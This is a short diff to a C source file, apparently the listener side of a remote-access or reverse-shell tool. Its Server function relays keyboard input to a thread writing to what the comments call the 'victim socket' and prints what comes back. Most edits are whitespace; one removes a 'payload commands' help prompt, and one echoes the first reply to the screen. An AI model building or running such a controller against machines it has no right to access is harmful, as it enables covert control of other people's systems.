@@ -220,11 +220,9 @@ void Server(char *address, char *port, int *type, int *family)
 		}
 
     // Passes arguments to the thread struct
-    a.src = STDIN_FILENO;
+        a.src = STDIN_FILENO;
 		a.dest = client_socket[0];
  		
-
-		printf("Type \"help\" to see a list of payload commands\n");
 
     // creates thread that will run parallel with the rest of the code to handle connection operations
     if (pthread_create(&printer, NULL, Writer, (void *)&a) != 0)
@@ -232,9 +230,10 @@ void Server(char *address, char *port, int *type, int *family)
         printf("Error in function pthread_create\n");
     }
    
-	  // reads data from the victim socket, executes code is data is found
+	// reads data from the victim socket, executes code is data is found
 
-    read(a.dest, buffer, MAXBUF);
+    n = read(a.dest, buffer, MAXBUF);
+    write(STDOUT_FILENO, buffer, n);
     while ((n = read(a.dest, buffer, MAXBUF)) > 0)
     {
 	
@@ -252,7 +251,7 @@ void Server(char *address, char *port, int *type, int *family)
     // sends a request to stop thread
     pthread_cancel(printer);
     pthread_join(printer, NULL);
-		close(master_socket);
+	close(master_socket);
     close(a.dest);
 		
 }
